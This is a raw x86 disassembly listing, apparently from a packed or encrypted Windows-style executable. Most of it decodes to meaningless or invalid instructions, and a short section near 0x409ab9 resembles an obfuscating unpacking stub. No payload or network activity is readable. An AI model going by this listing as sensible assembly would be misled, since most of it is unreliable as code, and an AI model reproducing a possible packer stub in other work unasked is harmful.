  4097cb:	fimul  WORD PTR [esi-0xd]
  4097ce:	test   al,0xca
  4097d0:	fsub   DWORD PTR [ebx+0x44]
  4097d3:	push   esi
  4097d4:	out    0x61,eax
  4097d6:	repz and DWORD PTR [ecx],edi
  4097d9:	jecxz  0x4097c0
  4097db:	lds    eax,FWORD PTR [ebx]
  4097dd:	inc    ebx
  4097de:	int3   
  4097df:	fadd   DWORD PTR [edx+0x5bb61f77]
  4097e5:	inc    ebx
  4097e6:	pop    DWORD PTR [ecx]
  4097e8:	idiv   DWORD PTR [esi]
  4097ea:	ret    0xc54e
  4097ed:	idiv   DWORD PTR [ebx-0x497a96f8]
  4097f3:	stos   BYTE PTR es:[edi],al
  4097f4:	lock inc edx
  4097f6:	fnstsw WORD PTR [eax]
  4097f8:	ins    DWORD PTR es:[edi],dx
  4097f9:	mov    DWORD PTR [ecx],ebx
  4097fb:	lds    ecx,FWORD PTR [ecx-0x4d]
  4097fe:	adc    edx,DWORD PTR [ecx-0x74]
  409801:	ret    0xa442
  409804:	dec    ebp
  409805:	fcmovu st,st(1)
  409807:	xchg   ecx,eax
  409808:	dec    ebp
  409809:	sar    DWORD PTR [edx],0xa9
  40980c:	into   
  40980d:	pop    ebx
  40980e:	aaa    
  40980f:	lahf   
  409810:	cs int 0x3f
  409813:	xor    ch,ah
  409815:	fcomi  st,st(1)
  409817:	add    BYTE PTR [esi-0x343bc59e],ah
  40981d:	test   eax,0xcb1a1d0b
  409822:	push   es
  409823:	jmp    0x40984e
  409825:	add    al,0x75
  409827:	add    esi,edi
  409829:	push   edi
  40982a:	adc    eax,0x406e7100
  40982f:	jo     0x4097ca
  409831:	mov    esp,0x4805550c
  409836:	add    ebx,DWORD PTR fs:[ebx-0x64]
  40983a:	xchg   esp,eax
  40983b:	cmp    BYTE PTR [ebp+edx*1+0x57],0xb2
  409840:	test   DWORD PTR [edx],esp
  409842:	outs   dx,DWORD PTR ds:[esi]
  409843:	pushf  
  409844:	test   eax,0xa5c7eabc
  409849:	in     eax,0xd4
  40984b:	dec    esp
  40984c:	aaa    
  40984d:	xchg   ebp,eax
  40984e:	jne    0x40985e
  409850:	xchg   ecx,eax
  409851:	sar    DWORD PTR [ebx],cl
  409853:	repnz mov WORD PTR [edi-0x6f77dac],ds
  40985a:	daa    
  40985b:	sbb    ebp,DWORD PTR [ebx+eiz*4+0x27]
  40985f:	xchg   ebx,eax
  409860:	jecxz  0x40988d
  409862:	cld    
  409863:	inc    ecx
  409864:	or     ah,BYTE PTR [edi]
  409866:	jmp    0x3955:0x76d868cf
  40986d:	(bad)  
  40986e:	lds    edi,FWORD PTR [esi-0x630f429a]
  409874:	ja     0x40980f
  409876:	mov    dl,0xe8
  409878:	xor    edi,DWORD PTR [ebp+0x4e]
  40987b:	or     al,0xa7
  40987d:	clc    
  40987e:	push   ebx
  40987f:	cmp    al,0x1b
  409881:	and    al,0xfa
  409883:	in     eax,0x14
  409885:	sti    
  409886:	fstp   TBYTE PTR [ebx+0x3d]
  409889:	push   edi
  40988a:	mov    dl,0xc6
  40988c:	sub    eax,0x13b65a46
  409891:	jecxz  0x409835
  409893:	out    dx,al
  409894:	(bad)  
  409895:	ins    BYTE PTR es:[edi],dx
  409896:	cmp    eax,0xed4bd330
  40989b:	scas   al,BYTE PTR es:[edi]
  40989c:	fsub   st(4),st
  40989e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40989f:	push   eax
  4098a0:	xchg   ebx,eax
  4098a1:	inc    esi
  4098a2:	fcmovne st,st(6)
  4098a4:	popf   
  4098a5:	pop    esi
  4098a6:	dec    eax
  4098a7:	mov    eax,ecx
  4098a9:	mov    BYTE PTR [edx],bl
  4098ab:	push   es
  4098ac:	scas   eax,DWORD PTR es:[edi]
  4098ad:	mov    ds:0xd7c82b27,eax
  4098b2:	in     eax,dx
  4098b3:	fnstsw WORD PTR [eax+0x2c69fa4e]
  4098b9:	fsub   QWORD PTR [edi-0x7dfb6669]
  4098bf:	inc    esp
  4098c0:	retf   0xd30a
  4098c3:	call   0x4031:0xe3e83980
  4098ca:	rcl    al,0xd4
  4098cd:	std    
  4098ce:	inc    esp
  4098cf:	pop    es
  4098d0:	outs   dx,DWORD PTR ds:[esi]
  4098d1:	push   0xe3be3328
  4098d6:	pop    esi
  4098d7:	out    0x76,al
  4098d9:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098db:	lock jg 0x40995a
  4098de:	sbb    BYTE PTR [esi+0x12b1535c],bh
  4098e4:	ins    BYTE PTR es:[edi],dx
  4098e5:	xchg   ecx,eax
  4098e6:	jnp    0x4098ec
  4098e8:	mov    esp,0xc9cada41
  4098ed:	pushf  
  4098ee:	pop    esi
  4098ef:	or     cl,BYTE PTR [ecx-0x16]
  4098f2:	daa    
  4098f3:	int    0x61
  4098f5:	pop    ebx
  4098f6:	fcom   QWORD PTR [edx+0x17e0eaca]
  4098fc:	outs   dx,DWORD PTR ds:[esi]
  4098fd:	div    ebp
  4098ff:	dec    edi
  409900:	add    DWORD PTR [eax],esi
  409902:	or     ch,bh
  409904:	out    dx,al
  409905:	or     bl,BYTE PTR cs:[ecx+0x15]
  409909:	mov    ebp,0xcb079306
  40990e:	dec    edx
  40990f:	adc    al,ch
  409911:	loopne 0x40994b
  409913:	loop   0x409980
  409915:	pusha  
  409916:	loop   0x40992b
  409918:	add    esp,esi
  40991a:	jne    0x4098e9
  40991c:	call   0xaddbb439
  409921:	pop    ebp
  409922:	mov    ecx,0x33c3d9eb
  409927:	mov    edi,0xd29a6c43
  40992c:	push   esp
  40992d:	les    ebx,FWORD PTR [ebx+0x692deb3a]
  409933:	nop
  409934:	and    al,0xbb
  409936:	loopne 0x40997a
  409938:	rol    BYTE PTR [esi+0x4739c0ec],0x14
  40993f:	inc    ebp
  409940:	add    edx,DWORD PTR [ebp-0x35d6d17a]
  409946:	pop    ds
  409947:	and    DWORD PTR [eax+edx*1],0xcc42241c
  40994e:	aas    
  40994f:	push   ebx
  409950:	(bad)  
  409951:	je     0x4098f6
  409953:	shl    DWORD PTR [edx],cl
  409955:	sti    
  409956:	xchg   BYTE PTR [esi+eax*4+0x7a],dh
  40995a:	jp     0x4098f9
  40995c:	pop    es
  40995d:	add    eax,0x2436da67
  409962:	and    al,0x4a
  409964:	loop   0x40997e
  409966:	pop    ds
  409967:	jg     0x409934
  409969:	mov    dh,0x0
  40996b:	int    0x48
  40996d:	and    BYTE PTR [ecx],0xb8
  409970:	loop   0x4099bd
  409972:	xor    ebx,DWORD PTR [esi+0x37aab43a]
  409978:	jmp    0xc973e7fd
  40997d:	aad    0x3d
  40997f:	sub    BYTE PTR [ebp-0x27],al
  409982:	cmp    DWORD PTR [edi-0x4a],esi
  409985:	dec    ebp
  409986:	int    0x4c
  409988:	push   esi
  409989:	jnp    0x409958
  40998b:	bound  esp,QWORD PTR [edi-0x55141b80]
  409991:	push   0xac829392
  409996:	cdq    
  409997:	hlt    
  409998:	and    ecx,DWORD PTR [ebp-0x6b]
  40999b:	mov    ds:0x9a38564c,eax
  4099a0:	sub    BYTE PTR [eax-0x2f],0x58
  4099a4:	in     al,0xce
  4099a6:	out    0x8c,al
  4099a8:	and    BYTE PTR [edx+0xb],dh
  4099ab:	cmp    eax,0x16b99f22
  4099b0:	and    eax,0xfb7097e0
  4099b5:	sbb    edi,DWORD PTR [ecx+0x2a]
  4099b8:	and    ebx,DWORD PTR fs:[edi]
  4099bb:	(bad)  
  4099bc:	daa    
  4099bd:	push   0xeb631af8
  4099c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099c3:	mov    eax,ds:0x9cce47f9
  4099c8:	out    dx,eax
  4099c9:	ss fs dec esp
  4099cc:	cs sub esi,edi
  4099cf:	pushf  
  4099d0:	cmp    dh,BYTE PTR [ecx-0x34]
  4099d3:	jae    0x40998e
  4099d5:	push   0xffffffb5
  4099d7:	mov    al,0x65
  4099d9:	sub    ebp,DWORD PTR [ebp+0xb]
  4099dc:	scas   al,BYTE PTR es:[edi]
  4099dd:	push   edi
  4099de:	pushf  
  4099df:	(bad)  
  4099e0:	sti    
  4099e1:	(bad)  
  4099e2:	les    edx,FWORD PTR [esi+ebx*8+0x5a77053f]
  4099e9:	jno    0x409a25
  4099eb:	outs   dx,BYTE PTR ds:[esi]
  4099ec:	or     ebx,ecx
  4099ee:	pop    es
  4099ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099f0:	and    DWORD PTR [ebx],ebp
  4099f2:	xchg   ebp,eax
  4099f3:	cmc    
  4099f4:	out    0x3d,al
  4099f6:	sub    al,0x8c
  4099f8:	sar    DWORD PTR [edi+0x4],0x99
  4099fc:	loopne 0x409a70
  4099fe:	sbb    DWORD PTR [esi+0x63],edi
  409a01:	loopne 0x409a2e
  409a03:	(bad)  
  409a04:	loop   0x409a30
  409a06:	push   edx
  409a07:	dec    esi
  409a08:	cmp    ah,0x8b
  409a0b:	xchg   edx,eax
  409a0c:	xchg   DWORD PTR [esi-0x76],edx
  409a0f:	and    al,0x44
  409a11:	test   DWORD PTR [edi],ebp
  409a13:	inc    edi
  409a14:	clc    
  409a15:	pop    ss
  409a16:	jns    0x40999d
  409a18:	inc    ecx
  409a19:	les    ebp,FWORD PTR [esi-0x53]
  409a1c:	stos   DWORD PTR es:[edi],eax
  409a1d:	mov    al,ds:0x4a4d89d8
  409a22:	mov    eax,0x99ec9049
  409a27:	push   0xffffff93
  409a29:	cmp    DWORD PTR [edi+eiz*8],eax
  409a2c:	(bad)  
  409a2d:	(bad)  [edx+edi*1]
  409a30:	push   es
  409a31:	mov    ax,0xdbc8
  409a35:	and    eax,0x14a65069
  409a3a:	pop    ebx
  409a3b:	addr16 mov bl,0xa6
  409a3e:	pusha  
  409a3f:	pop    eax
  409a40:	sbb    BYTE PTR [esi],dl
  409a42:	scas   eax,DWORD PTR es:[edi]
  409a43:	leave  
  409a44:	jmp    DWORD PTR [esi+0x11]
  409a47:	pop    ss
  409a48:	ins    DWORD PTR es:[edi],dx
  409a49:	fcmovbe st,st(4)
  409a4b:	ror    DWORD PTR [edi],1
  409a4d:	(bad)  
  409a4e:	pop    ds
  409a4f:	mov    bh,0x97
  409a51:	sub    al,0x3f
  409a53:	push   eax
  409a54:	repnz mov eax,0x64ccb3ca
  409a5a:	push   edx
  409a5b:	inc    esi
  409a5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a5d:	fidivr WORD PTR [eax]
  409a5f:	out    0xd4,eax
  409a61:	sub    BYTE PTR [eax-0xc211e5c],ch
  409a67:	inc    ebx
  409a68:	add    BYTE PTR [ebx],0x64
  409a6b:	pop    ecx
  409a6c:	jge    0x409a18
  409a6e:	into   
  409a6f:	mov    ecx,edx
  409a71:	adc    eax,0x248aa493
  409a76:	xor    edx,DWORD PTR [ecx-0x6e]
  409a79:	mov    edx,0x9956e865
  409a7e:	(bad)  
  409a7f:	stos   DWORD PTR es:[edi],eax
  409a80:	or     al,0x5a
  409a82:	add    cl,BYTE PTR [esi+0x350dbae]
  409a88:	xchg   ebx,eax
  409a89:	es pop esp
  409a8b:	ds sbb al,0x7b
  409a8e:	test   eax,0x8772c19e
  409a93:	int    0xda
  409a95:	mov    edi,DWORD PTR [esi]
  409a97:	cs inc edi
  409a99:	(bad)  
  409a9a:	stos   BYTE PTR es:[edi],al
  409a9b:	mov    ah,0x26
  409a9d:	cmp    eax,0xea64c3d
  409aa2:	pop    ecx
  409aa3:	lea    edx,[esi-0x2652ac7c]
  409aa9:	ror    BYTE PTR [edi+0x29934746],cl
  409aaf:	rol    BYTE PTR [eax],0x28
  409ab2:	xor    BYTE PTR [ecx+edi*1],ah
  409ab5:	clc    
  409ab6:	xchg   edx,eax
  409ab7:	mov    al,0x56
  409ab9:	mov    ecx,DWORD PTR ds:0x422008
  409abf:	add    ecx,DWORD PTR ds:0x420e82
  409ac5:	mov    DWORD PTR ds:0x422008,ecx
  409acb:	mov    esi,0xf89c85b5
  409ad0:	mov    DWORD PTR [ebp-0xc],esi
  409ad3:	mov    edx,DWORD PTR ds:0x420f34
  409ad9:	mov    ecx,DWORD PTR ds:0x42301c
  409adf:	sub    ecx,edx
  409ae1:	sub    edx,DWORD PTR [edx+ecx*1]
  409ae4:	lea    eax,[ebp-0xc]
  409ae7:	or     ecx,edx
  409ae9:	mov    DWORD PTR [ebp-0x14],eax
  409aec:	mov    eax,DWORD PTR [ebp-0xc]
  409aef:	mov    edx,DWORD PTR [ebp-0x14]
  409af2:	sbb    DWORD PTR ds:0x420fa0,ebx
  409af8:	mov    ecx,0x7510896
  409afd:	xor    eax,ecx
  409aff:	add    eax,0x3272dd
  409b04:	mov    DWORD PTR [edx],eax
  409b06:	mov    edx,DWORD PTR ds:0x42201c
  409b0c:	sbb    DWORD PTR ds:0x420ef0,edx
  409b12:	mov    eax,ds:0x4242ad
  409b17:	mov    edx,DWORD PTR [ebp-0x4]
  409b1a:	sbb    DWORD PTR ds:0x420fac,0x420e82
  409b24:	mov    eax,DWORD PTR [eax]
  409b26:	or     DWORD PTR ds:0x420f08,0x422000
  409b30:	add    eax,DWORD PTR [edx]
  409b32:	push   edi
  409b33:	mov    DWORD PTR [ebp-0x8],eax
  409b36:	jmp    0x40beb0
  409b3b:	popa   
  409b3c:	dec    edi
  409b3d:	jmp    0x409b64
  409b3f:	mov    ebx,0xf1fba379
  409b44:	jnp    0x409bbc
  409b46:	js     0x409baa
  409b48:	or     al,cl
  409b4a:	fidivr DWORD PTR [ecx]
  409b4c:	add    al,0x7a
  409b4e:	jp     0x409b69
  409b50:	pop    edi
  409b51:	jp     0x409bcd
  409b53:	jg     0x409b29
  409b55:	(bad)  
  409b56:	call   0x840c:0xeccf668d
  409b5d:	repnz aad 0x0
  409b60:	sbb    edx,esp
  409b62:	daa    
  409b63:	inc    edx
  409b64:	outs   dx,DWORD PTR ds:[esi]
  409b65:	test   BYTE PTR [ecx-0x1936c72d],ah
  409b6b:	pop    ebp
  409b6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b6d:	fldenv [ebp+0x257af6aa]
  409b73:	and    ecx,DWORD PTR [ebx+eax*8-0x28]
  409b77:	shr    DWORD PTR [ebp-0x1],1
  409b7a:	std    
  409b7b:	das    
  409b7c:	xchg   al,al
  409b7e:	hlt    
  409b7f:	sbb    dl,ch
  409b81:	xor    BYTE PTR [edx+0x7d26bdff],ah
  409b87:	xchg   ebx,eax
  409b88:	popf   
  409b89:	ins    DWORD PTR es:[edi],dx
  409b8a:	mov    edx,0x76a7b197
  409b8f:	fisubr DWORD PTR [ecx-0x15]
  409b92:	repz add cl,al
  409b95:	imul   esi,DWORD PTR [edx+0x1b],0xffffffbc
  409b99:	aad    0x58
  409b9b:	jle    0x409b7d
  409b9d:	mov    cl,0x6d
  409b9f:	retf   
  409ba0:	mov    dl,0xd0
  409ba2:	mov    DWORD PTR [edx+0x23],edi
  409ba5:	popf   
  409ba6:	je     0x409b4e
  409ba8:	pushf  
  409ba9:	mov    esp,0x7b57418c
  409bae:	cmp    al,0x61
  409bb0:	pop    edi
  409bb1:	dec    ecx
  409bb2:	sbb    ch,BYTE PTR [ebx]
  409bb4:	mov    ebx,0x5a86c2ef
  409bb9:	and    edx,DWORD PTR [edx]
  409bbb:	pusha  
  409bbc:	pusha  
  409bbd:	lahf   
  409bbe:	and    DWORD PTR [ebx+0x5d],ebx
  409bc1:	mov    esp,DWORD PTR [edi+eax*1]
  409bc4:	push   ebx
  409bc5:	push   ebp
  409bc6:	pusha  
  409bc7:	sbb    ebx,edi
  409bc9:	enter  0x8a3d,0xbe
  409bcd:	push   ds
  409bce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409bcf:	xlat   BYTE PTR ds:[ebx]
  409bd0:	jecxz  0x409c2d
  409bd2:	repz inc ebx
  409bd4:	into   
  409bd5:	outs   dx,BYTE PTR ds:[esi]
  409bd6:	cmp    eax,0x5fe29a3
  409bdb:	xchg   DWORD PTR [ebx-0x4f],edx
  409bde:	dec    esi
  409bdf:	xchg   esp,eax
  409be0:	xor    DWORD PTR [esp+ecx*4+0x208706d4],ecx
  409be7:	jno    0x409ba2
  409be9:	inc    ebp
  409bea:	addr16 push cs
  409bec:	dec    ebp
  409bed:	xchg   ebx,eax
  409bee:	jle    0x409c4c
  409bf0:	jmp    0x5e07ad06
  409bf5:	mov    dh,0x7b
  409bf7:	xchg   ebx,eax
  409bf8:	or     edx,DWORD PTR [ebx-0x433139f0]
  409bfe:	out    0x80,al
  409c00:	popa   
  409c01:	stos   DWORD PTR es:[edi],eax
  409c02:	in     eax,dx
  409c03:	clc    
  409c04:	add    dl,BYTE PTR [esp+ebx*4]
  409c07:	xor    al,0x70
  409c09:	push   cs
  409c0a:	test   ebx,edi
  409c0c:	test   ebp,edx
  409c0e:	fwait
  409c0f:	jl     0x409c75
  409c11:	sti    
  409c12:	jns    0x409c09
  409c14:	xor    al,0x34
  409c16:	rcl    DWORD PTR [ebp-0x13],cl
  409c19:	(bad)  
  409c1b:	fst    DWORD PTR ds:0xc50d3b71
  409c21:	add    eax,0x390c9d10
  409c26:	inc    ebx
  409c27:	cmp    cl,BYTE PTR [esi+0x68]
  409c2a:	out    dx,al
  409c2b:	mov    ch,0x21
  409c2d:	pop    edx
  409c2e:	jecxz  0x409bbb
  409c30:	nop
  409c31:	sub    ebp,DWORD PTR [edi-0x4acfbab5]
  409c37:	jle    0x409c95
  409c39:	rdmsr  
  409c3b:	xchg   esp,eax
  409c3c:	fld    QWORD PTR [ebp+0x61de7d17]
  409c42:	sbb    cl,ch
  409c44:	or     al,0x5e
  409c46:	neg    BYTE PTR [eax+edi*8-0x35]
  409c4a:	pushf  
  409c4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c4c:	loop   0x409c6d
  409c4e:	add    ch,dl
  409c50:	jp     0x409c65
  409c52:	inc    esp
  409c53:	fdiv   DWORD PTR [ebx-0x3f]
  409c56:	or     al,dl
  409c58:	push   0x3dfe901f
  409c5d:	repnz or ah,0xda
  409c61:	sbb    eax,0xf85c549b
  409c66:	xchg   edi,eax
  409c67:	sub    al,0xdb
  409c69:	mov    esi,DWORD PTR [ecx]
  409c6b:	data16 mov ch,0xdf
  409c6e:	(bad)  
  409c6f:	push   ebp
  409c70:	test   edx,ebp
  409c72:	test   al,0xac
  409c74:	scas   eax,DWORD PTR es:[edi]
  409c75:	outs   dx,DWORD PTR ds:[esi]
  409c76:	rcl    DWORD PTR [ebp-0x2ba90e74],0x6c
  409c7d:	test   DWORD PTR [edx+0x25],edx
  409c80:	xbegin 0x437648e9
  409c86:	mov    eax,ds:0x4133ef3d
  409c8b:	mov    ch,0x49
  409c8d:	mov    bl,bh
  409c8f:	stc    
  409c90:	sahf   
  409c91:	stc    
  409c92:	adc    BYTE PTR ds:0x564cd813,dl
  409c98:	(bad)  
  409c99:	mov    WORD PTR [edi+esi*2-0x27],es
  409c9d:	push   edi
  409c9e:	sti    
  409c9f:	nop    DWORD PTR [ebx+0x53]
  409ca3:	test   BYTE PTR [edi],0x5
  409ca6:	aas    
  409ca7:	leave  
  409ca8:	adc    eax,ebx
  409caa:	push   eax
  409cab:	out    0xff,al
  409cad:	inc    ebx
  409cae:	scas   eax,DWORD PTR es:[edi]
  409caf:	mov    ecx,0x9adc7823
  409cb4:	hlt    
  409cb5:	mov    BYTE PTR [edx],bh
  409cb7:	sub    eax,0x7a0d3492
  409cbc:	sar    BYTE PTR [eax+0x48],1
  409cbf:	mov    esp,0xe5fe50e0
  409cc4:	lods   eax,DWORD PTR ds:[esi]
  409cc5:	stos   BYTE PTR es:[edi],al
  409cc6:	jge    0x409cf5
  409cc8:	push   ss
  409cc9:	rcl    esp,1
  409ccb:	push   esp
  409ccc:	pop    es
  409ccd:	inc    ebx
  409cce:	outs   dx,BYTE PTR ds:[esi]
  409ccf:	pop    ds
  409cd0:	fs inc ebp
  409cd2:	mov    eax,ds:0x11187280
  409cd7:	mov    edi,ecx
  409cd9:	int    0x41
  409cdb:	or     dh,dh
  409cdd:	dec    esp
  409cde:	jle    0x409c62
  409ce0:	sub    BYTE PTR [edx-0x39ad688b],bh
  409ce6:	or     eax,ebp
  409ce8:	addr16 fucomp st(2)
  409ceb:	cmp    ebx,eax
  409ced:	xor    al,0xd1
  409cef:	sahf   
  409cf0:	(bad)  
  409cf1:	sub    edx,DWORD PTR [eax-0x46e314da]
  409cf7:	adc    al,0xd8
  409cf9:	xor    BYTE PTR [edx-0x5ec6fec8],dh
  409cff:	push   cs
  409d00:	cmp    BYTE PTR [ebx+0x18c29b79],0xd3
  409d07:	or     ecx,DWORD PTR [eiz*4+0x4d215cd4]
  409d0e:	retf   
  409d0f:	and    BYTE PTR [eax-0x2b9b1cce],bh
  409d15:	ret    0xcfa7
  409d18:	shl    BYTE PTR [ecx+0x22],0x76
  409d1c:	and    al,0x14
  409d1e:	je     0x409d97
  409d20:	ins    DWORD PTR es:[edi],dx
  409d21:	call   FWORD PTR [ebx]
  409d23:	jbe    0x409d85
  409d25:	shl    BYTE PTR [edi+0x6a186e0c],1
  409d2b:	into   
  409d2c:	and    al,BYTE PTR [edx]
  409d2e:	adc    al,0x35
  409d30:	mov    BYTE PTR [esi+0x3c],bh
  409d33:	and    al,0xa7
  409d35:	mov    dl,0x89
  409d37:	xor    al,0xd9
  409d39:	xchg   ebx,eax
  409d3a:	add    DWORD PTR [esi+edi*2-0x5],0xffffffff
  409d3f:	in     eax,dx
  409d40:	xchg   ecx,eax
  409d41:	cmp    DWORD PTR [edi+0x7277edbf],eax
  409d47:	cmp    eax,0xcd8d629c
  409d4c:	das    
  409d4d:	dec    esi
  409d4e:	fwait
  409d4f:	xor    BYTE PTR [eax+0x3b0e55eb],al
  409d55:	and    esp,DWORD PTR [esi]
  409d57:	xor    BYTE PTR [eax+0x38a579e9],ch
  409d5d:	adc    DWORD PTR [edi-0x15afc591],ebx
  409d63:	mov    esp,DWORD PTR [edi]
  409d65:	mov    ss,WORD PTR [ebp-0x1883b963]
  409d6b:	fadd   QWORD PTR [ecx]
  409d6d:	or     esp,DWORD PTR [edx-0x55]
  409d70:	fsub   st,st(3)
  409d72:	aaa    
  409d73:	and    al,0xfd
  409d75:	shl    DWORD PTR [ecx+0x537a58af],1
  409d7b:	in     eax,dx
  409d7c:	(bad)  
  409d7e:	les    esi,FWORD PTR [esi]
  409d80:	cmp    esp,DWORD PTR [edi+0x16]
  409d83:	add    edx,DWORD PTR [ebx]
  409d85:	ja     0x409d3d
  409d87:	xor    al,0x99
  409d89:	cmp    ah,dl
  409d8b:	lahf   
  409d8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d8d:	iret   
  409d8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d8f:	(bad)  
  409d90:	out    dx,eax
  409d91:	mov    eax,0x3b0d828e
  409d96:	inc    ecx
  409d97:	dec    eax
  409d98:	test   BYTE PTR [ecx+0x54ad5a0c],ch
  409d9e:	inc    edx
  409d9f:	cld    
  409da0:	mov    ebp,ebx
  409da2:	sbb    BYTE PTR [esi],al
  409da4:	or     al,0xf3
  409da6:	test   eax,0x5ab1a692
  409dab:	pop    ebp
  409dac:	mov    edi,0x6249e1ad
  409db1:	cmp    bl,dl
  409db3:	add    DWORD PTR [esi+0xd],esi
  409db6:	sbb    bl,BYTE PTR ds:0xfb204e63
  409dbc:	mov    bh,0xdf
  409dbe:	cmp    eax,0xc67b99ca
  409dc3:	lods   al,BYTE PTR ds:[esi]
  409dc4:	jb     0x409d7c
  409dc6:	iret   
  409dc7:	outs   dx,DWORD PTR ds:[esi]
  409dc8:	mov    dl,0x5a
  409dca:	enter  0x1bf8,0x51
  409dce:	inc    ebx
  409dcf:	xchg   esi,eax
  409dd0:	mul    DWORD PTR [edi-0xf71f525]
  409dd6:	shl    DWORD PTR [edx],1
  409dd8:	shl    DWORD PTR [eax+0x4a5f4a63],1
  409dde:	in     eax,0x67
  409de0:	lahf   
  409de1:	or     bl,al
  409de3:	mov    al,ds:0xd96ceb04
  409de8:	shr    esi,0xaa
  409deb:	xchg   esp,eax
  409dec:	mov    dl,0xb4
  409dee:	das    
  409def:	mov    al,0x57
  409df1:	jge    0x409dc4
  409df3:	xchg   ecx,eax
  409df4:	ret    
  409df5:	daa    
  409df6:	int3   
  409df7:	sbb    DWORD PTR [ecx+0x33],esp
  409dfa:	scas   eax,DWORD PTR es:[edi]
  409dfb:	mov    eax,ds:0xb9a2eb7f
  409e00:	das    
  409e01:	dec    ebp
  409e02:	xor    BYTE PTR [esi+ebp*8-0x3e],dh
  409e06:	(bad)  
  409e07:	dec    esp
  409e08:	pop    ds
  409e09:	ja     0x409e28
  409e0b:	(bad)  
  409e0c:	inc    DWORD PTR [esi+0x7686f538]
  409e12:	or     BYTE PTR ds:0x9fc3ea01,ah
  409e18:	cwd    
  409e1a:	sub    BYTE PTR [esi+esi*4+0x60bdcd51],0x2a
  409e22:	sar    DWORD PTR [ebx],cl
  409e24:	stos   DWORD PTR es:[edi],eax
  409e25:	int3   
  409e26:	seto   BYTE PTR [ecx]
  409e29:	outs   dx,BYTE PTR ds:[esi]
  409e2a:	fist   DWORD PTR [eax+0x244ec0d3]
  409e30:	icebp  
  409e31:	mov    al,0x55
  409e33:	jbe    0x409db9
  409e35:	fmul   DWORD PTR [ebp+0x73948f76]
  409e3b:	xchg   esp,eax
  409e3c:	cli    
  409e3d:	sub    al,0xac
  409e3f:	add    al,0xb2
  409e41:	addr16 jbe 0x409e39
  409e44:	rcl    BYTE PTR [eax+eiz*8],1
  409e47:	(bad)  
  409e48:	test   eax,0x5e3f954a
  409e4d:	jecxz  0x409df4
  409e4f:	push   esi
  409e50:	std    
  409e51:	sbb    BYTE PTR [edx-0x20],0xf2
  409e55:	add    BYTE PTR [edx+0x51],bh
  409e58:	add    eax,0xa91faf8d
  409e5d:	cli    
  409e5e:	lock add BYTE PTR [edx+0x3a5c4327],al
  409e65:	dec    ebp
  409e66:	cld    
  409e67:	fwait
  409e68:	data16 test al,0x41
  409e6b:	sub    eax,0xe696c3ae
  409e70:	(bad)  
  409e71:	and    eax,0xc569b161
  409e76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e77:	xchg   ecx,eax
  409e78:	jge    0x409e3e
  409e7a:	or     al,0x42
  409e7c:	mov    ch,0x30
  409e7e:	and    ebx,DWORD PTR [eax+0x2014711e]
  409e84:	shl    DWORD PTR [ecx-0x46cdb343],1
  409e8a:	rol    DWORD PTR [ebx-0x5da527e3],1
  409e90:	jg     0x409e43
  409e92:	mov    bh,0x10
  409e94:	mov    cl,0xc4
  409e96:	mov    ch,dh
  409e98:	retf   
  409e99:	jo     0x409e88
  409e9b:	and    eax,0xc82041ea
  409ea0:	shl    ch,1
  409ea2:	or     DWORD PTR [eax-0x52],edi
  409ea5:	mov    bl,0x1b
  409ea7:	jbe    0x409ee1
  409ea9:	mov    dh,0x6
  409eab:	repz push 0x64
  409eae:	xor    dl,dl
  409eb0:	inc    ebp
  409eb1:	pop    ss
  409eb2:	test   DWORD PTR [edi+0x3ffccdca],esi
  409eb8:	and    esi,DWORD PTR [ebx]
  409eba:	std    
  409ebb:	xor    edi,edx
  409ebd:	add    eax,0x93b6688
  409ec2:	test   al,0x77
  409ec4:	aad    0x38
  409ec6:	adc    ah,ch
  409ec8:	nop
  409ec9:	cli    
  409eca:	stos   BYTE PTR es:[edi],al
  409ecb:	jmp    0xc1ec:0x4734c4a7
  409ed2:	jbe    0x409f41
  409ed4:	jne    0x894cf862
  409eda:	retf   0xde72
  409edd:	fidivr WORD PTR [ecx-0x67]
  409ee0:	inc    esp
  409ee1:	jge    0x409f0a
  409ee3:	repnz inc esp
  409ee5:	push   ebx
  409ee6:	pop    edx
  409ee7:	inc    ebx
  409ee8:	mov    ecx,0x6eef3f74
  409eed:	outs   dx,BYTE PTR ds:[esi]
  409eee:	and    eax,0xd5189424
  409ef3:	jne    0x409ef8
  409ef5:	sbb    DWORD PTR [eax],edi
  409ef7:	shl    BYTE PTR [ecx+ebx*8],cl
  409efa:	cli    
  409efb:	sbb    ebp,ebp
  409efd:	jo     0x409f08
  409eff:	cmp    ebx,DWORD PTR [ebx]
  409f01:	int3   
  409f02:	mov    ebp,0xc6b646ea
  409f07:	out    dx,eax
  409f08:	push   eax
  409f09:	(bad)  
  409f0a:	out    0x9b,al
  409f0c:	adc    BYTE PTR [edx+0x18],al
  409f0f:	stos   DWORD PTR es:[edi],eax
  409f10:	pop    ecx
  409f11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f12:	inc    ebx
  409f13:	xchg   BYTE PTR [esp+ebx*4-0xfb5a4e8],dh
  409f1a:	cmp    eax,0x8a3750f2
  409f1f:	jnp    0x409f48
  409f21:	jno    0x409ee8
  409f23:	and    BYTE PTR [esp+eiz*4-0x3c],bl
  409f27:	jge    0x409f43
  409f29:	push   ss
  409f2a:	loope  0x409ed7
  409f2c:	ds push 0x4e
  409f2f:	mov    esi,0xedf5f983
  409f34:	sar    DWORD PTR [ebx],1
  409f36:	pop    edi
  409f37:	in     eax,dx
  409f38:	std    
  409f39:	inc    esi
  409f3a:	inc    ecx
  409f3b:	pop    ebp
  409f3c:	add    BYTE PTR [eax-0x46],cl
  409f3f:	in     al,0x52
  409f41:	leave  
  409f42:	retf   
  409f43:	push   esi
  409f44:	lahf   
  409f45:	pusha  
  409f46:	ret    0xaad5
  409f49:	popf   
  409f4a:	mov    ds:0xe8778b71,eax
  409f4f:	jmp    0xfb03:0xec8e5245
  409f56:	jl     0x409faf
  409f58:	adc    eax,0x973b2487
